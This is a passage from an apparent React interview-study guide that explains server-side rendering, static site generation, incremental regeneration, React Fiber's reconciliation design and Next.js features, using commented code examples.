
// ✅ Works on both:
function Component() {
  const [width, setWidth] = useState(0);
  
  useEffect(() => {
    setWidth(window.innerWidth); // Only runs on client
  }, []);
  
  return <div>{width || 'Loading...'}</div>;
}

// 4. Build Complexity
// Need two builds: server and client

// webpack.server.js (Node.js target)
module.exports = {
  target: 'node',
  entry: './server.js',
  output: {
    filename: 'server.bundle.js'
  }
};

// webpack.client.js (Browser target)
module.exports = {
  target: 'web',
  entry: './client.js',
  output: {
    filename: 'client.bundle.js'
  }
};

SSR with React 18 Features:
----------------------------

// renderToString (Legacy):
import { renderToString } from 'react-dom/server';

const html = renderToString(<App />);
// Returns complete HTML string
// Blocks until entire tree rendered
// Doesn't support Suspense

// renderToPipeableStream (React 18):
import { renderToPipeableStream } from 'react-dom/server';

app.get('/', (req, res) => {
  const { pipe } = renderToPipeableStream(<App />, {
    onShellReady() {
      res.setHeader('Content-Type', 'text/html');
      pipe(res); // Start streaming HTML
    }
  });
});

// Benefits:
// - Streams HTML as it's ready
// - Supports Suspense
// - Better Time to First Byte (TTFB)
// - Server can start sending before everything rendered

// Streaming SSR Example:
import { Suspense, lazy } from 'react';

const Comments = lazy(() => import('./Comments'));

function BlogPost({ post }) {
  return (
    <article>
      <h1>{post.title}</h1>
      <div>{post.content}</div>
      
      {/* Stream this later * /}
      <Suspense fallback={<div>Loading comments...</div>}>
        <Comments postId={post.id} />
      </Suspense>
    </article>
  );
}

// Server sends:
// 1. Initial HTML with article and fallback
// 2. Comments HTML when ready (streamed)
// 3. Script to replace fallback with comments

SSR Frameworks:
---------------

// 1. Next.js (Most popular)
// pages/index.js
export async function getServerSideProps() {
  const posts = await fetchPosts();
  return { props: { posts } };
}

export default function Home({ posts }) {
  return (
    <div>
      {posts.map(post => <Post key={post.id} post={post} />)}
    </div>
  );
}

// 2. Remix
// routes/index.tsx
export async function loader() {
  const posts = await fetchPosts();
  return json({ posts });
}

export default function Index() {
  const { posts } = useLoaderData();
  return (
    <div>
      {posts.map(post => <Post key={post.id} post={post} />)}
    </div>
  );
}

// 3. Gatsby (Hybrid SSG/SSR)
// gatsby-node.js
exports.createPages = async ({ actions }) => {
  const posts = await fetchPosts();
  posts.forEach(post => {
    actions.createPage({
      path: `/post/${post.id}`,
      component: require.resolve('./src/templates/post.js'),
      context: { post }
    });
  });
};

When to Use SSR:
----------------

// ✅ Use SSR for:
// - Content-heavy sites (blogs, news)
// - E-commerce product pages
// - Marketing pages
// - Social media shareable content
// - SEO-critical pages

// ❌ Don't use SSR for:
// - Dashboards (authenticated)
// - Internal tools
// - Real-time apps
// - Apps with lots of user interaction

// Alternative: Static Site Generation (SSG)
// Pre-render pages at build time
// Serve static HTML
// Best of both worlds for content that doesn't change often

Summary:

Server-Side Rendering (SSR):
- Renders React on server
- Sends HTML to client
- Client hydrates HTML
- Faster First Contentful Paint
- Better SEO
- Social media meta tags
- Requires server
- More complex setup
- Higher server load
- Use for content-heavy, SEO-critical sites
- React 18 enables streaming SSR
- Frameworks: Next.js, Remix, Gatsby
*/


/**
83. What is static site generation (SSG)?
-----------------------------------------

Static Site Generation (SSG) is the process of pre-rendering pages at build time,
generating static HTML files that can be served directly. No server rendering
needed for each request.

SSG vs SSR vs CSR:
------------------

// Client-Side Rendering (CSR):
// 1. Server sends empty HTML
// 2. Browser downloads JavaScript
// 3. React renders content
// 4. Content appears

// Server-Side Rendering (SSR):
// 1. User requests page
// 2. Server renders React to HTML
// 3. Server sends HTML
// 4. User sees content
// 5. JavaScript hydrates

// Static Site Generation (SSG):
// 1. At build time, render all pages to HTML
// 2. Deploy static HTML files
// 3. User requests page
// 4. CDN serves pre-rendered HTML instantly
// 5. JavaScript hydrates

Basic SSG Example:
------------------

// Build time (during deployment):
import { renderToString } from 'react-dom/server';
import fs from 'fs';

// Generate homepage
const homeHtml = renderToString(<HomePage />);
fs.writeFileSync('dist/index.html', `
  <!DOCTYPE html>
  <html>
    <body>
      <div id="root">${homeHtml}</div>
      <script src="/bundle.js"></script>
    </body>
  </html>
`);

// Generate about page
const aboutHtml = renderToString(<AboutPage />);
fs.writeFileSync('dist/about.html', `
  <!DOCTYPE html>
  <html>
    <body>
      <div id="root">${aboutHtml}</div>
      <script src="/bundle.js"></script>
    </body>
  </html>
`);

// Deploy dist/ folder to CDN
// Users get instant HTML, no server rendering!

SSG with Data:
--------------

// Build script:
async function generateBlogPosts() {
  // Fetch all posts at build time
  const posts = await fetchAllPosts();
  
  // Generate HTML for each post
  for (const post of posts) {
    const html = renderToString(<BlogPost post={post} />);
    
    fs.writeFileSync(`dist/posts/${post.slug}.html`, `
      <!DOCTYPE html>
      <html>
        <head>
          <title>${post.title}</title>
          <meta name="description" content="${post.excerpt}">
        </head>
        <body>
          <div id="root">${html}</div>
          <script>
            window.__INITIAL_DATA__ = ${JSON.stringify({ post })};
          </script>
          <script src="/bundle.js"></script>
        </body>
      </html>
    `);
  }
}

// Run at build time
generateBlogPosts();

// Result: 100 blog posts = 100 HTML files
// dist/posts/first-post.html
// dist/posts/second-post.html
// ...

SSG Benefits:
-------------

// 1. Blazing Fast
// No server rendering, just static files
// Served from CDN edge locations
// Sub-100ms response times

// 2. Cheap/Free Hosting
// No server needed
// Host on Netlify, Vercel, GitHub Pages, S3
// Pay only for CDN bandwidth

// 3. Perfect SEO
// Fully-rendered HTML from first request
// No JavaScript required for search engines

// 4. Scalability
// Handles millions of users
// No server to crash
// CDN handles traffic spikes

// 5. Security
// No server = no server vulnerabilities
// No database connections
// Static files only

SSG with Next.js:
-----------------

// pages/index.js
export async function getStaticProps() {
  // Runs at build time
  const posts = await fetchPosts();
  
  return {
    props: { posts }
  };
}

export default function Home({ posts }) {
  return (
    <div>
      <h1>Blog</h1>
      {posts.map(post => (
        <article key={post.id}>
          <h2>{post.title}</h2>
          <p>{post.excerpt}</p>
        </article>
      ))}
    </div>
  );
}

// Dynamic routes:
// pages/posts/[slug].js
export async function getStaticPaths() {
  // Generate paths at build time
  const posts = await fetchAllPosts();
  
  return {
    paths: posts.map(post => ({
      params: { slug: post.slug }
    })),
    fallback: false // 404 for paths not generated
  };
}

export async function getStaticProps({ params }) {
  // Fetch data for specific post
  const post = await fetchPost(params.slug);
  
  return {
    props: { post }
  };
}

export default function Post({ post }) {
  return (
    <article>
      <h1>{post.title}</h1>
      <div>{post.content}</div>
    </article>
  );
}

// Build command generates:
// /index.html
// /posts/first-post.html
// /posts/second-post.html
// /posts/third-post.html

Incremental Static Regeneration (ISR):
---------------------------------------

// Problem: Content changes after build
// SSG: Must rebuild entire site
// SSR: Server renders every request

// ISR: Best of both worlds
// - Serve static HTML
// - Rebuild specific pages on demand

// Next.js ISR:
export async function getStaticProps() {
  const posts = await fetchPosts();
  
  return {
    props: { posts },
    revalidate: 60 // Rebuild every 60 seconds
  };
}

// How it works:
// 1. User requests /blog
// 2. Serve cached HTML (instant)
// 3. Check if > 60 seconds old
// 4. If yes, rebuild in background
// 5. Next request gets fresh HTML

// Timeline:
// 0:00 - Build site, cache blog page
// 0:30 - User A requests /blog -> cached HTML (fast!)
// 1:00 - User B requests /blog -> cached HTML + triggers rebuild
// 1:05 - Rebuild completes
// 1:10 - User C requests /blog -> fresh HTML

SSG with Gatsby:
----------------

// gatsby-config.js
module.exports = {
  plugins: [
    {
      resolve: 'gatsby-source-filesystem',
      options: {
        name: 'posts',
        path: `${__dirname}/content/posts`
      }
    },
    'gatsby-transformer-remark'
  ]
};

// gatsby-node.js
exports.createPages = async ({ graphql, actions }) => {
  const { createPage } = actions;
  
  // Query all posts
  const result = await graphql(`
    query {
      allMarkdownRemark {
        nodes {
          id
          frontmatter {
            slug
          }
        }
      }
    }
  `);
  
  // Create page for each post
  result.data.allMarkdownRemark.nodes.forEach(node => {
    createPage({
      path: `/posts/${node.frontmatter.slug}`,
      component: require.resolve('./src/templates/blog-post.js'),
      context: {
        id: node.id
      }
    });
  });
};

// src/templates/blog-post.js
import { graphql } from 'gatsby';

export const query = graphql`
  query($id: String!) {
    markdownRemark(id: { eq: $id }) {
      frontmatter {
        title
        date
      }
      html
    }
  }
`;

export default function BlogPost({ data }) {
  const { markdownRemark } = data;
  
  return (
    <article>
      <h1>{markdownRemark.frontmatter.title}</h1>
      <time>{markdownRemark.frontmatter.date}</time>
      <div dangerouslySetInnerHTML={{ __html: markdownRemark.html }} />
    </article>
  );
}

When to Use SSG:
----------------

// ✅ Use SSG for:
// - Marketing websites
// - Blogs
// - Documentation sites
// - Landing pages
// - Portfolio sites
// - Product catalogs (that don't change often)

// Example: Blog
const pages = [
  '/index.html',           // Homepage
  '/about.html',          // About
  '/posts/post-1.html',   // Blog posts
  '/posts/post-2.html',
  // ...
];
// All pre-rendered at build time

// ❌ Don't use SSG for:
// - User dashboards (personalized content)
// - Real-time data (stock prices)
// - User-generated content (comments in real-time)
// - Frequently changing data

// Example: Dashboard
// - Shows user's personal data
// - Different for every user
// - Can't pre-render
// - Use SSR or CSR instead

Hybrid Approach:
----------------

// Next.js allows mixing SSG, SSR, and CSR

// pages/index.js (SSG)
export async function getStaticProps() {
  const posts = await fetchPosts();
  return { props: { posts }, revalidate: 3600 };
}

// pages/dashboard.js (SSR)
export async function getServerSideProps({ req }) {
  const user = await getUserFromSession(req);
  return { props: { user } };
}

// pages/profile.js (CSR)
export default function Profile() {
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    fetch('/api/user').then(r => r.json()).then(setUser);
  }, []);
  
  if (!user) return <div>Loading...</div>;
  return <div>{user.name}</div>;
}

// Choose strategy per page!

Build Process:
--------------

// package.json
{
  "scripts": {
    "build": "next build && next export"
  }
}

// Run build:
$ npm run build

// Next.js:
// 1. Calls getStaticProps for each page
// 2. Fetches data
// 3. Renders pages to HTML
// 4. Writes HTML files to out/ directory
// 5. Copies static assets

// Output:
out/
  index.html
  about.html
  posts/
    first-post.html
    second-post.html
  _next/
    static/
      chunks/
      css/

// Deploy out/ directory to CDN

Performance Comparison:
-----------------------

// Request Timeline:

// CSR:
// 0ms:    Request sent
// 50ms:   HTML received (empty)
// 150ms:  JS downloaded
// 200ms:  JS parsed
// 250ms:  React rendered
// 300ms:  API call
// 400ms:  Data received
// 450ms:  Content displayed
// Total: 450ms to content

// SSR:
// 0ms:    Request sent
// 200ms:  HTML received (with content)
// 250ms:  JS downloaded
// 300ms:  Hydration complete
// Total: 200ms to content, 300ms to interactive

// SSG:
// 0ms:    Request sent
// 20ms:   HTML received from CDN (with content)
// 100ms:  JS downloaded
// 150ms:  Hydration complete
// Total: 20ms to content, 150ms to interactive

// SSG is fastest!

Summary:

Static Site Generation (SSG):
- Pre-render pages at build time
- Generate static HTML files
- Serve from CDN
- Blazing fast performance
- Perfect SEO
- Cheap hosting
- Excellent scalability
- Best for content that doesn't change often
- Incremental Static Regeneration for updating
- Frameworks: Next.js, Gatsby, Astro
- Can mix with SSR and CSR
- Industry best practice for content sites
*/


/**
84. What is React Fiber?
------------------------

React Fiber is a complete rewrite of React's core reconciliation algorithm introduced
in React 16. It enables incremental rendering, allowing React to split work into chunks,
pause and resume rendering, and prioritize updates for a more responsive user experience.

Before Fiber (React 15 and earlier):
------------------------------------

// Stack Reconciler:
// - Synchronous rendering
// - Once started, can't stop
// - Blocks main thread
// - Janky animations during large updates

function renderTree(element) {
  // Render all children recursively
  const children = element.children.map(renderTree);
  
  // Create DOM node
  const node = createElement(element.type);
  children.forEach(child => node.appendChild(child));
  
  return node;
}

// Problem: Large trees block UI
const tree = (
  <div>
    {[...Array(10000)].map((_, i) => <Item key={i} />)}
  </div>
);

renderTree(tree); // Blocks for 100ms+
// User can't click, scroll, or type during render!

With Fiber (React 16+):
-----------------------

// Fiber Reconciler:
// - Incremental rendering
// - Can pause and resume work
// - Prioritizes updates
// - Keeps UI responsive
// - Enables concurrent features

// Can split 100ms render into 10ms chunks
// Yield to browser between chunks
// Handle user input immediately

What is a Fiber?
----------------

// A Fiber is a JavaScript object representing a unit of work
// Each component has a corresponding fiber node

// Fiber Node Structure:
const fiberNode = {
  // Component info
  type: 'div',              // Type of element/component
  key: 'unique-key',        // Key for reconciliation
  
  // Instance
  stateNode: DOMNode,       // Reference to actual DOM node or component instance
  
  // Relationships (Linked List)
  return: parentFiber,      // Parent fiber
  child: firstChildFiber,   // First child
  sibling: nextSiblingFiber, // Next sibling
  
  // Work tracking
  pendingProps: {},         // Props for this render
  memoizedProps: {},        // Props from last render
  memoizedState: {},        // State from last render
  
  // Effects
  effectTag: 'UPDATE',      // What needs to happen (PLACEMENT, UPDATE, DELETION)
  nextEffect: nextFiber,    // Next fiber with effects
  
  // Scheduling
  lanes: 0,                 // Priority of work
  
  // Double buffering
  alternate: wipFiber       // Reference to work-in-progress fiber
};

Fiber Tree Structure:
---------------------

// React component tree:
<App>
  <Header>
    <Logo />
    <Nav />
  </Header>
  <Content>
    <Sidebar />
    <Main />
  </Content>
</App>

// Corresponding Fiber tree (linked list):
//
//        App
//         |
//         ↓ (child)
//      Header → Content (sibling)
//         |         |
//         ↓         ↓ (child)
//      Logo → Nav  Sidebar → Main (sibling)
//         ↑         ↑
//         | (return/parent)

// Each arrow represents a pointer:
// - child: First child
// - sibling: Next sibling
// - return: Parent

// Traversal order:
// App → Header → Logo → Nav → Content → Sidebar → Main

Key Features of Fiber:
----------------------

// 1. Incremental Rendering
// Work split into units that can be paused

function workLoop(deadline) {
  let shouldYield = false;
  
  while (nextUnitOfWork && !shouldYield) {
    nextUnitOfWork = performUnitOfWork(nextUnitOfWork);
    
    // Check if we have time remaining
    shouldYield = deadline.timeRemaining() < 1;
  }
  
  if (nextUnitOfWork) {
    // More work to do, schedule next frame
    requestIdleCallback(workLoop);
  } else {
    // All work done, commit to DOM
    commitRoot();
  }
}

requestIdleCallback(workLoop);

// React yields control back to browser every few milliseconds
// Keeps UI responsive even during large updates

// 2. Priority Levels
// Different updates have different priorities

const priorities = {
  Immediate: 1,        // User input (clicks, typing)
  UserBlocking: 2,     // Needs to complete quickly (hover, scroll)
  Normal: 3,           // Most updates (data fetching)
  Low: 4,              // Can be deferred (analytics)
  Idle: 5              // Nice to have (prefetching)
};

// Example:
function SearchBox() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  
  const handleChange = (e) => {
    // High priority - update input immediately
    setQuery(e.target.value);
    
    // Low priority - update results when time available
    startTransition(() => {
      const filtered = expensiveFilter(e.target.value);
      setResults(filtered);
    });
  };
  
  return (
    <div>
      <input value={query} onChange={handleChange} />
      <Results results={results} />
    </div>
  );
}

// 3. Time Slicing
// Break work into slices, yield between slices

// Without time slicing:
// [====== 100ms render ======] (UI frozen)

// With time slicing:
// [5ms]--[5ms]--[5ms]--[5ms]--[5ms]...
//      ↑      ↑      ↑      ↑
//      Browser can handle events here

// 4. Suspense
// Fiber enables Suspense for data/code loading

function Component() {
  const data = use(fetchData()); // Suspends if not ready
  return <div>{data}</div>;
}

<Suspense fallback={<Loading />}>
  <Component />
</Suspense>

// Fiber pauses rendering while waiting for data
// Shows fallback UI
// Resumes when data ready

Two-Phase Architecture:
------------------------

// Phase 1: Render Phase (Interruptible)
// - Build work-in-progress fiber tree
// - Call render methods
// - Compute diffs
// - Can be paused/aborted
// - Pure, no side effects

function renderPhase() {
  // Build new fiber tree
  const workInProgress = createWorkInProgress(currentFiber);
  
  // Call component functions
  const element = Component(props);
  
  // Reconcile children
  reconcileChildren(workInProgress, element);
  
  // Mark effects needed
  workInProgress.effectTag = 'UPDATE';
  
  // Can pause here if higher priority work arrives
  if (hasHigherPriorityWork()) {
    return; // Resume later
  }
  
  // Continue with next unit of work
  performUnitOfWork(nextFiber);
}

// Phase 2: Commit Phase (Synchronous, Cannot be interrupted)
// - Apply changes to DOM
// - Run lifecycle methods
// - Run useLayoutEffect
// - Schedule useEffect
// - Must complete once started

function commitPhase() {
  // Apply all DOM mutations
  commitMutations(finishedWork);
  
  // Update refs
  commitRefs(finishedWork);
  
  // Run useLayoutEffect
  commitLayoutEffects(finishedWork);
  
  // Switch current tree pointer
  currentRoot = finishedWork;
  
  // Schedule useEffect (after paint)
  scheduleEffects(finishedWork);
}

Double Buffering:
-----------------

// Fiber uses two trees:
// 1. Current tree - what's on screen
// 2. Work-in-progress tree - being built

// Current tree:
App (v1)
  └─ Component (v1)

// Update triggered, create work-in-progress tree:
App (v2) WIP
  └─ Component (v2) WIP

// Each fiber has 'alternate' pointer:
currentFiber.alternate = workInProgressFiber;
workInProgressFiber.alternate = currentFiber;

// After commit, swap pointers:
currentRoot = workInProgressRoot;

// Old current becomes new work-in-progress for next update
// Reuses memory, avoids garbage collection

Reconciliation with Fiber:
---------------------------

function reconcileChildren(fiber, elements) {
  let index = 0;
  let oldFiber = fiber.alternate?.child;
  let prevSibling = null;
  
  while (index < elements.length || oldFiber) {
    const element = elements[index];
    let newFiber = null;
    
    // Compare old and new
    const sameType = oldFiber && element && 
                     oldFiber.type === element.type;
    
    if (sameType) {
      // Update existing fiber
      newFiber = {
        type: oldFiber.type,
        props: element.props,
        stateNode: oldFiber.stateNode,
        parent: fiber,
        alternate: oldFiber,
        effectTag: 'UPDATE'
      };
    }
    
    if (element && !sameType) {
      // New element, create fiber
      newFiber = {
        type: element.type,
        props: element.props,
        stateNode: null,
        parent: fiber,
        alternate: null,
        effectTag: 'PLACEMENT'
      };
    }
    
    if (oldFiber && !sameType) {
      // Old element removed
      oldFiber.effectTag = 'DELETION';
      deletions.push(oldFiber);
    }
    
    // Link siblings
    if (index === 0) {
      fiber.child = newFiber;
    } else {
      prevSibling.sibling = newFiber;
    }
    
    prevSibling = newFiber;
    index++;
    oldFiber = oldFiber?.sibling;
  }
}

Work Loop:
----------

// Simplified work loop
let nextUnitOfWork = null;
let currentRoot = null;
let workInProgressRoot = null;

function workLoop(deadline) {
  let shouldYield = false;
  
  while (nextUnitOfWork && !shouldYield) {
    nextUnitOfWork = performUnitOfWork(nextUnitOfWork);
    shouldYield = deadline.timeRemaining() < 1;
  }
  
  if (!nextUnitOfWork && workInProgressRoot) {
    // Render phase complete, commit
    commitRoot();
  }
  
  requestIdleCallback(workLoop);
}

function performUnitOfWork(fiber) {
  // 1. Render this fiber
  if (fiber.type instanceof Function) {
    updateFunctionComponent(fiber);
  } else {
    updateHostComponent(fiber);
  }
  
  // 2. Return next unit of work
  if (fiber.child) {
    return fiber.child; // Process children first
  }
  
  let nextFiber = fiber;
  while (nextFiber) {
    if (nextFiber.sibling) {
      return nextFiber.sibling; // Process siblings
    }
    nextFiber = nextFiber.return; // Go up to parent
  }
  
  return null; // All work done
}

requestIdleCallback(workLoop);

Benefits of Fiber:
------------------

// 1. Better Performance
// - Splits work into chunks
// - Doesn't block main thread
// - Smooth animations even during updates

// 2. Better User Experience
// - Prioritizes user input
// - Keeps UI responsive
// - No janky interactions

// 3. Enables New Features
// - Concurrent Mode
// - Suspense
// - startTransition
// - useDeferredValue
// - Automatic batching

// 4. Better Error Handling
// - Error boundaries work better
// - Can recover from errors
// - Doesn't crash entire app

// 5. Scheduling
// - High priority updates interrupt low priority
// - Time-sensitive updates processed first
// - Background updates when idle

Real-World Example:
-------------------

// Large list update with Fiber

function ItemList({ items }) {
  return (
    <div>
      {items.map(item => <Item key={item.id} data={item} />)}
    </div>
  );
}

// User adds 1000 items:
setItems([...items, ...new1000Items]);

// Without Fiber (React 15):
// - Renders all 1000 items synchronously
// - Blocks for ~200ms
// - UI frozen
// - User can't interact

// With Fiber (React 16+):
// - Splits into ~40 chunks of 25 items each
// - Renders chunk 1 (5ms)
// - Yields to browser
// - User can click, scroll
// - Renders chunk 2 (5ms)
// - Yields to browser
// - ... continues ...
// - All chunks complete in ~200ms total
// - But UI never frozen!

Fiber Reconciliation Example:
------------------------------

// Update scenario:
function Counter() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <h1>Count: {count}</h1>
      <button onClick={() => setCount(count + 1)}>+</button>
    </div>
  );
}

// Click button:

// 1. Fiber Work Phase (Render):
// - Current fiber tree:
//   div → h1 ("Count: 0") → button
//
// - Create work-in-progress tree:
//   div → h1 ("Count: 1") → button
//
// - Compare trees:
//   div: same ✓
//   h1: text changed, mark UPDATE
//   button: same ✓
//
// - Build effect list: [h1]

// 2. Commit Phase:
// - Apply effects:
//   h1.textContent = "Count: 1"
//
// - Switch trees:
//   currentRoot = workInProgressRoot

// 3. Result:
// - Only h1 text node updated
// - div and button untouched
// - Minimal DOM operations

Comparison Table:
-----------------

// Feature              | Stack (Old)    | Fiber (New)
// ---------------------|----------------|------------------
// Rendering            | Synchronous    | Incremental
// Can pause            | No             | Yes
// Priority             | No             | Yes
// Concurrent           | No             | Yes
// Suspense             | No             | Yes
// Error boundaries     | Basic          | Advanced
// Time slicing         | No             | Yes
// Scheduling           | No             | Yes
// Main thread blocking | Yes            | Minimal

Summary:

React Fiber:
- Complete rewrite of React's core (React 16+)
- Enables incremental rendering
- Can pause and resume work
- Prioritizes updates
- Uses linked list data structure
- Two-phase architecture (render + commit)
- Double buffering for efficiency
- Enables concurrent features
- Better performance and UX
- Foundation for modern React features
- Time slicing keeps UI responsive
- Scheduling based on priority
- Critical innovation for React's future
*/




/**
85. What is Next.js and why is it used?
--------------------------------------

Next.js is a React framework that provides production-ready features like server-side
rendering, static site generation, API routes, file-based routing, and more. It's
built on top of React and extends it with powerful capabilities for building modern
web applications.

What is Next.js:
----------------

// Regular React App:
// - Client-side only
// - Manual routing setup
// - No SSR out of the box
// - Need separate backend for APIs
// - Manual optimization

// Next.js App:
// - SSR, SSG, ISR built-in
// - File-based routing
// - API routes included
// - Automatic code splitting
// - Image optimization
// - Much more...

Basic Next.js Setup:
--------------------

// Install:
npx create-next-app@latest my-app

// Project structure:
my-app/
  pages/
    index.js          // Route: /
    about.js          // Route: /about
    blog/
      [slug].js       // Route: /blog/:slug
    api/
      hello.js        // API: /api/hello
  public/
    images/
  styles/
  next.config.js

// pages/index.js
export default function Home() {
  return (
    <div>
      <h1>Welcome to Next.js!</h1>
      <p>This is the homepage</p>
    </div>
  );
}

// That's it! No routing setup needed.
// Visit http://localhost:3000 - it works!

Why Use Next.js:
----------------

// 1. Server-Side Rendering (SSR)
// Pages rendered on server for each request

export async function getServerSideProps() {
  const data = await fetchData();
  return { props: { data } };
}

export default function Page({ data }) {
  return <div>{data}</div>;
}

// Benefits:
// - Better SEO
// - Faster initial load
// - Dynamic data

// 2. Static Site Generation (SSG)
// Pre-render pages at build time

export async function getStaticProps() {
  const posts = await fetchPosts();
  return { props: { posts } };
}

export default function Blog({ posts }) {
  return posts.map(post => <Post key={post.id} {...post} />);
}

// Benefits:
// - Lightning fast
// - No server needed
// - Perfect SEO

// 3. API Routes
// Backend API in same project

// pages/api/users.js
export default function handler(req, res) {
  if (req.method === 'GET') {
    const users = getUsers();
    res.status(200).json(users);
  }
}

// Call from frontend:
fetch('/api/users')
  .then(r => r.json())
  .then(users => console.log(users));

// Benefits:
// - Full-stack in one project
// - No CORS issues
// - Easy deployment

// 4. File-Based Routing
// No react-router needed!

// pages/index.js → /
// pages/about.js → /about
// pages/blog/[slug].js → /blog/:slug
// pages/posts/[id]/comments/[commentId].js → /posts/:id/comments/:commentId

// Automatic code splitting per route!

// 5. Automatic Code Splitting
// Each page only loads what it needs

// pages/home.js
import HeavyComponent from '../components/HeavyComponent';

export default function Home() {
  return <HeavyComponent />;
}

// pages/about.js
import LightComponent from '../components/LightComponent';

export default function About() {
  return <LightComponent />;
}

// Home page: Loads HeavyComponent.js
// About page: Loads LightComponent.js
// Automatically optimized!

// 6. Image Optimization
import Image from 'next/image';

function Profile() {
  return (
    <Image
      src="/profile.jpg"
      width={500}
      height={500}
      alt="Profile"
    />
  );
}

// Automatically:
// - Resizes images
// - Lazy loads
// - WebP format
// - Responsive images
// - Prevents layout shift

// 7. Built-in CSS Support
// Import CSS directly

// styles/Home.module.css
.container {
  padding: 20px;
}

// pages/index.js
import styles from '../styles/Home.module.css';

export default function Home() {
  return <div className={styles.container}>Hello</div>;
}

// CSS Modules, Sass, CSS-in-JS all supported!

// 8. Fast Refresh
// Edit code, see changes instantly
// Preserves component state!

function Counter() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>+</button>
      {/* Edit this text and see instant update without losing count! * /}
    </div>
  );
}

// 9. TypeScript Support
// Built-in TypeScript support

// tsconfig.json automatically generated
// Just rename .js to .tsx

// pages/index.tsx
import { GetStaticProps } from 'next';

interface Props {
  posts: Post[];
}

export const getStaticProps: GetStaticProps<Props> = async () => {
  const posts = await fetchPosts();
  return { props: { posts } };
};

export default function Home({ posts }: Props) {
  return <div>{posts.map(post => <Post key={post.id} {...post} />)}</div>;
}

Key Features:
-------------

// 1. Hybrid Rendering
// Mix SSR, SSG, CSR in same app

// pages/index.js (SSG)
export async function getStaticProps() {
  return { props: { title: 'Home' } };
}

// pages/dashboard.js (SSR)
export async function getServerSideProps() {
  const user = await getUser();
  return { props: { user } };
}

// pages/profile.js (CSR)
function Profile() {
  const [data, setData] = useState(null);
  
  useEffect(() => {
    fetch('/api/profile').then(r => r.json()).then(setData);
  }, []);
  
  return <div>{data?.name}</div>;
}

// 2. Incremental Static Regeneration (ISR)
export async function getStaticProps() {
  const posts = await fetchPosts();
  
  return {
    props: { posts },
    revalidate: 60 // Rebuild every 60 seconds
  };
}

// 3. Built-in Environment Variables
// .env.local
NEXT_PUBLIC_API_URL=https://api.example.com
SECRET_KEY=secret123

// In code:
console.log(process.env.NEXT_PUBLIC_API_URL); // Client-side accessible
console.log(process.env.SECRET_KEY); // Server-side only

// 4. Preview Mode
// Preview draft content before publishing

export default function Post({ post }) {
  return <article>{post.content}</article>;
}

export async function getStaticProps({ preview, previewData }) {
  const post = preview
    ? await getDraftPost(previewData.id)
    : await getPublishedPost();
  
  return { props: { post } };
}

// 5. Internationalization (i18n)
// next.config.js
module.exports = {
  i18n: {
    locales: ['en', 'fr', 'es'],
    defaultLocale: 'en',
  },
};

// Automatic routing:
// /about → English
// /fr/about → French
// /es/about → Spanish

Performance Benefits:
---------------------

// Automatic optimizations:

// 1. Prefetching
<Link href="/about">
  <a>About</a>  {/* Prefetches /about in background * /}
</Link>

// 2. Code splitting
// Each page = separate bundle
// Only load what's needed

// 3. Tree shaking
// Remove unused code automatically

// 4. Minification
// CSS and JavaScript minified in production

// 5. Compression
// Gzip/Brotli compression enabled

When to Use Next.js:
--------------------

// ✅ Use Next.js for:
// - Content-heavy sites (blogs, news, docs)
// - E-commerce sites
// - Marketing sites
// - SaaS applications
// - Dashboards with SSR needs
// - Full-stack applications

// ❌ Next.js might be overkill for:
// - Simple SPAs
// - Static landing pages (use Astro)
// - Mobile apps (use React Native)
// - Embedded widgets

Real-World Example:
-------------------

// Blog with Next.js

// pages/index.js (Homepage - SSG)
export async function getStaticProps() {
  const posts = await fetchPosts();
  return { props: { posts }, revalidate: 3600 };
}

export default function Home({ posts }) {
  return (
    <div>
      <h1>My Blog</h1>
      {posts.map(post => (
        <article key={post.id}>
          <Link href={`/posts/${post.slug}`}>
            <a><h2>{post.title}</h2></a>
          </Link>
          <p>{post.excerpt}</p>
        </article>
      ))}
    </div>
  );
}

// pages/posts/[slug].js (Blog post - SSG with dynamic routes)
export async function getStaticPaths() {
  const posts = await fetchPosts();
  const paths = posts.map(post => ({ params: { slug: post.slug } }));
  return { paths, fallback: 'blocking' };
}

export async function getStaticProps({ params }) {
  const post = await fetchPost(params.slug);
  return { props: { post } };
}

export default function Post({ post }) {
  return (
    <article>
      <h1>{post.title}</h1>
      <Image src={post.image} width={800} height={400} alt={post.title} />
      <div dangerouslySetInnerHTML={{ __html: post.content }} />
    </article>
  );
}

// pages/api/newsletter.js (API route)
export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email } = req.body;
    await subscribeToNewsletter(email);
    res.status(200).json({ message: 'Subscribed!' });
  }
}

Deployment:
-----------

// Vercel (recommended):
// 1. Push to GitHub
// 2. Connect to Vercel
// 3. Auto-deploy on push
// Done!

// Features:
// - Edge network
// - Automatic HTTPS
// - Preview deployments
// - Environment variables
// - Analytics

// Other platforms:
// - AWS (via Amplify or custom)
// - Google Cloud
// - Azure
// - Netlify
// - DigitalOcean
// - Self-hosted

Comparison:
-----------

// Create React App:
// - Client-side only
// - Manual routing
// - No SSR/SSG
// - No API routes
// - Manual optimization
// - Good for: SPAs

// Next.js:
// - SSR, SSG, ISR
// - File-based routing
// - API routes
// - Automatic optimization
// - Many built-in features
// - Good for: Production apps

// Gatsby:
// - SSG focused
// - GraphQL data layer
// - Plugin ecosystem
// - Great for: Static sites

// Remix:
// - SSR focused
// - Web standards
// - Nested routes
// - Great for: Dynamic apps


/**
86. What is the difference between SSR, SSG, and ISR in Next.js?
----------------------------------------------------------------

Next.js supports three main rendering strategies: Server-Side Rendering (SSR),
Static Site Generation (SSG), and Incremental Static Regeneration (ISR). Each
has different use cases and trade-offs.

1. Server-Side Rendering (SSR):
--------------------------------

// Renders HTML on server for each request
// Use getServerSideProps

// pages/profile.js
export async function getServerSideProps(context) {
  // Runs on every request
  const { req, res, params, query } = context;
  
  // Access cookies, headers
  const session = req.cookies.session;
  
  // Fetch user-specific data
  const user = await fetchUser(session);
  
  // Can redirect
  if (!user) {
    return {
      redirect: {
        destination: '/login',
        permanent: false,
      },
    };
  }
  
  return {
    props: { user }, // Passed to component
  };
}

export default function Profile({ user }) {
  return (
    <div>
      <h1>Welcome, {user.name}</h1>
      <p>Email: {user.email}</p>
    </div>
  );
}

// How SSR works:
// 1. User requests /profile
// 2. Server runs getServerSideProps
// 3. Server fetches user data
// 4. Server renders React to HTML
// 5. Server sends HTML to client
// 6. Client receives rendered page
// 7. React hydrates on client
// 8. Page interactive

// Use SSR when:
